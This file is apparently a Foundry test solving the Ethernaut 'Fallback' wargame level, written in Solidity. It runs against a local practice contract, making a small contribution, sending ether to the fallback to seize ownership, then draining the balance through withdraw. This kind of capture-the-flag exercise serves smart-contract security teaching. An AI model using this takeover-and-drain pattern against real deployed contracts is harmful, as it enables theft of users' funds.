//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Fallback} from "../../src/ethernaut/fallback.sol";

contract hackFallback is Test {
    Fallback fallBack;

    function setUp() public {
        fallBack = new Fallback();
    }

    function test_hackFallback() public {
        vm.startPrank(0x4948F43e559A38C1fDbeB2d7C5476d3c0Bda15E7);
        vm.deal(0x4948F43e559A38C1fDbeB2d7C5476d3c0Bda15E7, 1 ether);
        fallBack.contribute{value: 0.0001 ether}();
        (bool ok, ) = address(fallBack).call{value: 0.1 ether}(""); // this will send from the msg.sender account;
        assertTrue(ok);
        // take the ownership of the contract ;
        assertEq(fallBack.owner(), 0x4948F43e559A38C1fDbeB2d7C5476d3c0Bda15E7);
        // call the withdraw function
        assertGt(address(fallBack).balance, 0);
        fallBack.withdraw();
        assertEq(address(fallBack).balance, 0);
    }
}
